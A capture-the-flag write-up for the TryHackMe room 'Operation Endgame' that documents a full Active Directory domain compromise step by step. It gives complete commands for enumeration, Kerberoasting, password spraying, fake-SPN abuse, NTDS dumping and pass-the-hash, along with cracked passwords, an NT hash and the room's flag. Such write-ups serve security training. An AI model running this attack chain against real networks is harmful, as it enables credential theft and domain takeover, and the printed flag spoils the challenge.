# 🏴 TryHackMe: Operation Endgame

<p align="center">
  <img src="https://tryhackme-badges.s3.amazonaws.com/operationendgame.png" alt="Operation Endgame Badge" />
</p>

| Field | Details |
|-------|---------|
| **Platform** | TryHackMe |
| **Room** | [Operation Endgame](https://tryhackme.com/room/operationendgame) |
| **Difficulty** | Hard |
| **Category** | Active Directory |
| **Time** | ~60 min |
| **Flag** | `THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}` |

---

## 📖 Story

> *"Operation Endgame was firing on all cylinders. Sneaky Viper, our black hat crew, had become the worst nightmare. After months of gathering information and carrying out operations, we found the way to their system, and boom: mission complete."*

A single-flag Active Directory exploitation challenge. Starting with zero credentials, the goal is to fully compromise the `thm.local` domain and retrieve the flag from the Domain Controller.

---

## 🗺️ Attack Path Overview

```
[Anonymous] 
    │
    ├─ RustScan + enum4linux-ng        → Domain: thm.local | DC: ad.thm.local
    ├─ Anonymous LDAP bind             → 21,000+ objects dumped
    ├─ CrackMapExec RID Brute          → 492 domain users → realusers.txt
    ├─ Guest account confirmed         → No password required
    │
    ├─ AS-REP Roasting (dead end)      → 5 hashes, uncrackable
    │
    ├─ Kerberoasting via Guest         → CODY_ROY hash
    ├─ John the Ripper                 → CODY_ROY : MKO)mko0
    ├─ xFreeRDP                        → RDP access as CODY_ROY
    │
    ├─ Password Spray                  → ZACHARY_HUNT reuses MKO)mko0
    ├─ BloodHound                      → ZACHARY_HUNT →[GenericWrite]→ JERRI_LANCASTER
    │                                     JERRI_LANCASTER →[AddSelf/WriteOwner]→ READER ADMINS
    │
    ├─ bloodyAD                        → Set fake SPN on JERRI_LANCASTER
    ├─ Targeted Kerberoasting          → JERRI_LANCASTER hash
    ├─ John the Ripper                 → JERRI_LANCASTER : lovinlife!
    ├─ xFreeRDP                        → RDP access as JERRI_LANCASTER
    │
    ├─ C:\Scripts\syncer.ps1           → SANFORD_DAUGHERTY : RESET_ASAP123 (hardcoded!)
    ├─ BloodHound                      → SANFORD_DAUGHERTY →[MemberOf]→ DOMAIN ADMINS
    ├─ CrackMapExec                    → (Pwn3d!) confirmed Domain Admin
    │
    ├─ secretsdump.py -just-dc-ntlm   → Full NTDS dump, Administrator NT hash
    ├─ smbclient PTH                   → C$ access as Administrator
    └─ flag.txt.txt                    → THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `rustscan` | Fast port scanning |
| `nmap` | Service version detection |
| `enum4linux-ng` | SMB/LDAP/RPC enumeration |
| `ldapsearch` | Anonymous LDAP enumeration |
| `crackmapexec` | RID brute force, password spray, PTH |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `impacket-GetUserSPNs` | Kerberoasting |
| `john` | Hash cracking |
| `hashcat` | Hash cracking (attempted) |
| `bloodhound-python` | AD attack path collection |
| `BloodHound` | AD attack path visualisation |
| `xfreerdp` | RDP access |
| `bloodyAD` | GenericWrite abuse / SPN manipulation |
| `impacket-secretsdump` | NTDS credential dumping |
| `smbclient` | SMB file access / Pass-the-Hash |

---

## 🔍 Phase 1: Reconnaissance

### Port Scan (RustScan)

```bash
rustscan -a 10.114.139.22
```

**Open Ports:**

| Port | Service |
|------|---------|
| 53 | DNS |
| 80 | HTTP |
| 88 | Kerberos |
| 135 | RPC |
| 139 | NetBIOS |
| 389 | LDAP |
| 443 | HTTPS |
| 445 | SMB |
| 593 | RPC over HTTP |

> Port 80/443 was unusual for a DC, flagged for later investigation.

---

### SMB & Domain Enumeration (enum4linux-ng)

```bash
enum4linux-ng -A 10.114.139.22
```

**Key Findings:**

| Field | Value |
|-------|-------|
| Domain | `THM` |
| Domain SID | `S-1-5-21-1966530601-3185510712-10604624` |
| DNS Domain | `thm.local` |
| FQDN | `ad.thm.local` |
| NetBIOS Name | `AD` |
| OS | Windows Server 2019 (Build 17763) |
| SMB Signing | **Required** (relay attacks not possible) |
| Null Session | **Allowed** |

> SMB signing being required ruled out NTLM relay attacks early.  
> Null sessions being allowed opened the door for unauthenticated enumeration.

---

### LDAP Enumeration

```bash
# Anonymous bind, dumped entire directory (21,000+ lines)
ldapsearch -x -H ldap://10.114.139.22 -b "DC=thm,DC=local" > ldap.txt

# Filtered: only users with a description field set
ldapsearch -x -H ldap://10.114.139.22 -b "DC=thm,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
```

**Result:** 192 users with description fields, descriptions contained role info (e.g. "Tier 1 User") but no plaintext passwords in this case.

---

### RID Brute Force (CrackMapExec)

Using the null session to enumerate all domain users via RID cycling:

```bash
crackmapexec smb 10.114.139.22 -u '' -p '' --rid-brute 2>/dev/null | grep "SidTypeUser" | awk -F'\' '{print $2}' | awk '{print $1}' > realusers.txt
```

**Result:** **492 domain users** extracted into `realusers.txt`

```bash
# Verified Guest account exists (no password)
grep -i guest realusers.txt
# Guest
```

---

## 🔓 Phase 2: Initial Access

### AS-REP Roasting (Dead End)

With the full user list, attempted AS-REP Roasting against all 492 accounts:

```bash
GetNPUsers.py thm.local/ -dc-ip 10.114.139.22 -usersfile realusers.txt -format hashcat -outputfile asrep.txt -no-pass
```

**Vulnerable accounts found:**
- `SHELLEY_BEARD`
- `ISIAH_WALKER`
- `QUEEN_GARNER`
- `PHYLLIS_MCCOY`
- `MAXINE_FREEMAN`

```bash
# Attempted cracking, failed
hashcat --force -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> **Dead End:** All 5 AS-REP hashes resisted cracking with rockyou.txt. Pivoted away.

---

### Kerberoasting via Guest Account

Remembered the `Guest` account requires no password, used it for authenticated Kerberoasting:

```bash
GetUserSPNs.py thm.local/Guest -dc-ip 10.114.139.22 -outputfile kerberoast.txt
# Password: [blank, just pressed Enter]
```

**SPN found:**

| User | SPN | Group |
|------|-----|-------|
| `CODY_ROY` | `HTTP/server.secure.com` | Remote Desktop Users |

```bash
# Cracking with john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

**Result:** `CODY_ROY` : `MKO)mko0` ✅

---

### RDP Access as CODY_ROY

```bash
xfreerdp /v:10.114.139.22 /u:CODY_ROY /p:'MKO)mko0' /dynamic-resolution +clipboard /cert:ignore
```

Successfully logged into the Windows desktop as `CODY_ROY`.

---

## 🔺 Phase 3: Lateral Movement

### Password Spray: Reuse Discovery

Sprayed `CODY_ROY`'s password across all 492 domain users:

```bash
crackmapexec smb 10.114.139.22 -u realusers.txt -p 'MKO)mko0' --continue-on-success 2>/dev/null | grep "+"
```

**Password reuse found:**

| User | Password |
|------|---------|
| `CODY_ROY` | `MKO)mko0` |
| `ZACHARY_HUNT` | `MKO)mko0` |

---

### BloodHound Collection

Fixed DNS resolution issue first, then collected AD data:

```bash
# Fix DNS to point at DC
echo "nameserver 10.114.139.22 search thm.local" > /etc/resolv.conf

# Collect all AD data
bloodhound-python -u CODY_ROY -p 'MKO)mko0' -d thm.local -ns 10.114.139.22 -c All --zip
```

**Collection stats:**
- 490 users | 53 groups | 4 GPOs
- 216 OUs | 19 containers | 1 computer
- Output: `20260304113949_bloodhound.zip`

---

### BloodHound Analysis: Attack Path Discovery

After loading data into BloodHound:

**CODY_ROY** : No useful outbound control rights.

**ZACHARY_HUNT** : Critical finding:

```
ZACHARY_HUNT →[GenericWrite]→ JERRI_LANCASTER
JERRI_LANCASTER →[AddSelf]→ READER ADMINS
JERRI_LANCASTER →[WriteOwner]→ READER ADMINS
```

**GenericWrite** on a user allows setting arbitrary attributes including `servicePrincipalName`: enabling **Targeted Kerberoasting**.

---

### Targeted Kerberoasting: JERRI_LANCASTER

**Step 1:** Set a fake SPN on `JERRI_LANCASTER` using `bloodyAD` as `ZACHARY_HUNT`:

```bash
bloodyAD -u ZACHARY_HUNT -p 'MKO)mko0' -d thm.local --host 10.114.139.22 --dc-ip 10.114.189.12 set object JERRI_LANCASTER serviceprincipalName -v 'http/fake.thm.local'
# [+] JERRI_LANCASTER's servicePrincipalName has been updated
```

> **Why this works:** Normal user accounts don't have SPNs. Once a fake SPN is set, the DC treats the account as a service and will issue a TGS ticket encrypted with the user's password hash, making it Kerberoastable.

**Step 2:** Request the TGS hash:

```bash
GetUserSPNs.py thm.local/ZACHARY_HUNT:'MKO)mko0' -dc-ip 10.114.189.12 -outputfile jerri_hash.txt
```

**Step 3:** Crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt jerri_hash.txt
```

**Result:** `JERRI_LANCASTER` : `lovinlife!` ✅

---

### RDP Access as JERRI_LANCASTER

```bash
xfreerdp /v:10.114.189.12 /u:JERRI_LANCASTER /p:'lovinlife!' /dynamic-resolution +clipboard /cert:ignore
```

`JERRI_LANCASTER` is a member of `Reader Admins`: giving read access to sensitive areas of the DC.

---

## 👑 Phase 4: Domain Compromise

### Hardcoded Credentials in Script

Browsing `C:\` as `JERRI_LANCASTER`, found a suspicious PowerShell script:

```powershell
# C:\Scripts\syncer.ps1
Import-Module ActiveDirectory

# Define credentials
$Username = "SANFORD_DAUGHERTY"
$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

# Sync Active Directory
Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
```

**Plaintext credentials hardcoded:** `SANFORD_DAUGHERTY` : `RESET_ASAP123`

BloodHound had already shown `SANFORD_DAUGHERTY` has a **direct path to Domain Admins**.

---

### Domain Admin Confirmation

```bash
crackmapexec smb 10.114.189.12 -u SANFORD_DAUGHERTY -p 'RESET_ASAP123'
# [+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!)
```

`Pwn3d!` confirms Domain Admin level access.

---

### NTDS Dump (secretsdump)

```bash
secretsdump.py thm.local/SANFORD_DAUGHERTY:'RESET_ASAP123'@10.114.189.12 -just-dc-ntlm
```

**Domain Administrator hash extracted:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e599bf2fe56d6a21b3a5487bb4761d1b:::
```

---

### Pass-the-Hash: Administrator Access

```bash
smbclient '\\10.114.189.12\C$' -U 'administrator' --pw-nt-hash e599bf2fe56d6a21b3a5487bb4761d1b
```

Navigated to `C:\Users\Administrator\Desktop\` and retrieved the flag:

```bash
smb: \Users\Administrator\Desktop\> get flag.txt.txt
smb: \Users\Administrator\Desktop\> exit
cat flag.txt.txt
```

---

## 🏆 Flag

```
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

---

## 📚 Key Takeaways

1. **Null sessions are dangerous**: Anonymous SMB/LDAP access enabled full user enumeration without any credentials.

2. **Guest accounts matter**: The `Guest` account with no password allowed authenticated Kerberoasting, bypassing the need for real credentials.

3. **Password reuse is pervasive**: A single cracked password (`MKO)mko0`) was reused by multiple accounts in the same domain.

4. **GenericWrite = Targeted Kerberoast** : Writing a fake SPN to a user account instantly makes them Kerberoastable, even if they had no SPN before.

5. **Hardcoded credentials are a critical risk**: `syncer.ps1` stored Domain Admin-level credentials in plaintext on the filesystem.

6. **BloodHound is essential**: Without visualising the attack path, the `ZACHARY_HUNT → JERRI_LANCASTER → READER ADMINS` chain would have been extremely difficult to find manually.

7. **AV can block psexec**: When `psexec.py` was blocked by AV (drops an exe), `smbclient` with Pass-the-Hash was used as an alternative.

---

## 🔗 References

- [Impacket Suite](https://github.com/fortra/impacket)
- [BloodHound](https://github.com/SpecterOps/BloodHound)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [HackTricks: Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks: GenericWrite Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
- [TryHackMe Room](https://tryhackme.com/room/operationendgame)

---

*Writeup by [taguianas], March 2026*